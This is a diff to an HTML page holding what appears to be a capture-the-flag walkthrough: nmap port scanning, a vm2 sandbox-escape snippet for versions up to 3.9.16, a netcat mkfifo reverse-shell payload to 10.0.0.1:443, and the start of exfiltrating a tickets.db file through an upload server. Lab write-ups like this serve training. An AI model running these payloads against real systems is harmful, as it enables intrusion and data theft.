@@ -160,10 +160,9 @@
                         </div>
                     </h2>
                     <div class="ui hidden divider "></div>
-                    <p>Port Enumeration:</p>
+                    <p><img src="/media/1%202zqbeP26SB5iDgOINWaPfQ-3674822343.png" alt="">  </p>
+<p>Port Enumeration:</p>
 <p>We conducted a port scan to assess the available ports on the target IP using the following command:</p>
-<pre><code>bash
-</code></pre>
 <pre><code>nmap -p- --min-rate 5000 $TARGET -sV 
 </code></pre>
 <p>The scan results unveiled several open ports:</p>
@@ -183,8 +182,6 @@
 <p>Exploitation Discovery:</p>
 <p>Research into known vulnerabilities for the Node.js library led to a post on GitHub (<a href="https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244">https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244</a>) detailing a vulnerability in the <code>handleException()</code> function. This vulnerability enables escaping the sandbox and executing arbitrary code for VM2 versions up to 3.9.16.</p>
 <p>The vulnerable code snippet is as follows:</p>
-<pre><code>javascript
-</code></pre>
 <pre><code>const {VM} = require(&quot;vm2&quot;);
 const vm = new VM();
 const code =  err = {};
@@ -206,14 +203,10 @@ console.log(vm.run(code));
 </code></pre>
 <p>Executing a bash command such as <code>ls</code> or <code>whoami</code> confirms the functionality of the code.</p>
 <p>Now, it&#39;s time for Remote Code Execution (RCE)! I utilized the following payload for this purpose:</p>
-<pre><code>bash
-</code></pre>
 <pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 443 &gt;/tmp/f
 </code></pre>
 <p>This payload establishes a reverse shell to 10.0.0.1 on port 443.</p>
 <p>Additionally, we discovered a database file located at <code>/var/www/contacts/tickets.db</code>. To exfiltrate the file, we utilized the following method:</p>
-<pre><code>bash
-</code></pre>
 <pre><code># Listen to files
 python3 -m pip install --user uploadserver
 python3 -m uploadserver
